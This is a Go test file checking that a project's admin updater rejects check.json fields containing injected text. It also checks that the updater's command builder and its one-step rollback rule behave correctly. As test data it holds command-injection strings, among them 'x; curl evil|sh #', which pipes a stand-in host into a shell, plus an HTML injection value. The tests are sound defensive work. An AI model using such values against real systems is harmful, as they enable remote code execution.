package admin

import (
	"net/http"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/hasayone/empataso-tds/internal/config"
	"github.com/hasayone/empataso-tds/internal/cron"
)

// injectedCommit is a check.json target that would run a second command if it reached a shell.
const injectedCommit = "x; curl evil|sh #"

// TestUpdateIgnoresCheckWithInjectedFields verifies that check.json fields outside the commit,
// tag, version and channel formats are not trusted: the update view carries no check, no
// command with the foreign text and no apply, and the apply route refuses with no_update.
func TestUpdateIgnoresCheckWithInjectedFields(t *testing.T) {
	mutations := map[string]func(*cron.CheckFile){
		"target commit":  func(c *cron.CheckFile) { c.Target.Commit = injectedCommit },
		"current commit": func(c *cron.CheckFile) { c.Current.Commit = injectedCommit },
		"target tag":     func(c *cron.CheckFile) { c.Target.Tag = "v1.0.0; id" },
		"target version": func(c *cron.CheckFile) { c.Target.Version = "<a href=//evil>" },
		"channel":        func(c *cron.CheckFile) { c.Channel = "main; id" },
		"listed commit": func(c *cron.CheckFile) {
			c.Commits = []cron.CheckCommit{{SHA: injectedCommit, Subject: "s"}}
		},
	}
	for name, mutate := range mutations {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			inboxDir := t.TempDir()
			_, srv := newUpdateServer(t, dir, inboxDir)
			c, csrf := loginAdmin(t, srv.URL)
			restore := config.SetBuildForTest(config.BuildInfo{
				Version: "v1.0.0", Commit: validCommit, CommitDate: "2026-01-01T00:00:00Z", Channel: "main",
			})
			defer restore()

			writeAgentFile(t, dir, freshAgent())
			check := freshCheck()
			mutate(&check)
			writeCheckFile(t, dir, check)

			v := getUpdate(t, c, srv.URL)
			if v.Check != nil {
				t.Errorf("check = %+v, want nil", v.Check)
			}
			if v.CanApply || v.ApplyBlock != "no_update" {
				t.Errorf("apply %v %q, want blocked as no_update", v.CanApply, v.ApplyBlock)
			}
			for _, cmd := range v.CLI {
				if strings.Contains(cmd, "curl") || strings.Contains(cmd, ";") {
					t.Errorf("command carries the foreign text: %q", cmd)
				}
			}
			code, body := callJSON(t, c, http.MethodPost, srv.URL+"/api/update/apply", csrf,
				`{"target":"`+anotherCommit+`","confirm":"`+anotherCommit[:7]+`"}`)
			if code != http.StatusConflict || !strings.Contains(string(body), "no_update") {
				t.Errorf("apply: %d %s, want 409 no_update", code, body)
			}
		})
	}
}

// TestUpdateCLIRefusesForeignTarget verifies that updateCLI returns no commands for a target
// that is not a 40-hex commit and keeps the placeholder for an empty one.
func TestUpdateCLIRefusesForeignTarget(t *testing.T) {
	if got := updateCLI(injectedCommit, false); len(got) != 0 {
		t.Errorf("foreign target: %q, want no commands", got)
	}
	if got := updateCLI("", false); len(got) != 4 || !strings.Contains(got[2], "<sha>") {
		t.Errorf("empty target: %q, want four commands with the placeholder", got)
	}
}

// TestRollbackBlockAfterRollback verifies the one-step rule of the updater: a successful
// rollback in state.json blocks the next one with no_previous, while an apply, a failed
// rollback or a refusal does not.
func TestRollbackBlockAfterRollback(t *testing.T) {
	finished := time.Now()
	cases := []struct {
		name  string
		state cron.StateFile
		want  string
	}{
		{"rollback ok", cron.StateFile{Action: "rollback", Result: cron.StateOK, FinishedAt: &finished}, "no_previous"},
		{"apply ok", cron.StateFile{Action: "apply", Result: cron.StateOK, FinishedAt: &finished}, ""},
		{"rollback failed", cron.StateFile{Action: "rollback", Result: cron.StateFailed, FinishedAt: &finished}, ""},
		{"rollback refused", cron.StateFile{Action: "rollback", Result: cron.StateRefused, FinishedAt: &finished}, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			inboxDir := t.TempDir()
			_, srv := newUpdateServer(t, dir, inboxDir)
			c, csrf := loginAdmin(t, srv.URL)
			restore := config.SetBuildForTest(config.BuildInfo{
				Version: "v1.0.0", Commit: validCommit, CommitDate: "2026-01-01T00:00:00Z", Channel: "main",
			})
			defer restore()

			writeAgentFile(t, dir, freshAgent())
			writeCheckFile(t, dir, freshCheck())
			tc.state.Schema = 1
			tc.state.ID = "aaaa1111bbbb2222"
			if err := cron.WriteUpdateJSON(filepath.Join(dir, cron.UpdateStateFile), tc.state); err != nil {
				t.Fatal(err)
			}

			v := getUpdate(t, c, srv.URL)
			if v.RollbackBlock != tc.want || v.CanRollback != (tc.want == "") {
				t.Fatalf("rollback %v %q, want block %q", v.CanRollback, v.RollbackBlock, tc.want)
			}
			if tc.want == "" {
				return
			}
			code, body := callJSON(t, c, http.MethodPost, srv.URL+"/api/update/rollback", csrf, `{"confirm":"rollback"}`)
			if code != http.StatusConflict || !strings.Contains(string(body), tc.want) {
				t.Errorf("rollback: %d %s, want 409 %s", code, body, tc.want)
			}
		})
	}
}
